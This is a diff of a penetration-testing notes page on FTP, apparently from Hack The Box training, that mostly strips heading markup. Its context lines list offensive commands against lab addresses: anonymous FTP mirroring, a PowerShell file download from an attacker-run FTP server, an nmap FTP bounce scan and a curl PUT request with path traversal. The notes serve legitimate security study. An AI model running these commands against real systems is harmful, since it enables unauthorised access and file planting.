@@ -1,4 +1,3 @@
-############
 FTP
 ############
 
@@ -6,14 +5,12 @@ FTP
 
 Status:
 
-Tags: `powershell <powershell>`__ `Footprinting <Footprinting>`__
 
-*****************
 Description
 *****************
+
 File Transfer Protocol
 
-*****************
 VsFTP
 *****************
 
@@ -39,7 +36,6 @@ Using `wget <wget>`__ to download all FTP files:
 
     wget -m --no-passive ftp://anonymous:anonymous@10.129.14.136
 
-*****************
 SSL enabled FTP
 *****************
 
@@ -50,7 +46,6 @@ bonus is we get to see the cert.
 
    openssl s_client -connect 10.129.14.136:21 -starttls ftp
 
-**********************************
 Creating a quick/dirty FTP server
 **********************************
 
@@ -81,7 +76,6 @@ program as a client with
 
    PS C:\htb> (New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')```powershell
 
-*****************
 FTP Bounce Attack
 *****************
 
@@ -94,7 +88,6 @@ Example: Using **nmap -b** and bouncing off a FTP server
 
    nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2
 
-**********************************
 FTP Exploit examples
 **********************************
 
@@ -104,6 +97,5 @@ Example 1:Exploiting a PUT request from Curl
 
    curl -k -X PUT -H "HOST: <host-ip>" --basic -u <username>:<password> --data-binary "PoC." --path-as-is https://<IP>/../../../../../
 
-*****************
 References
 *****************
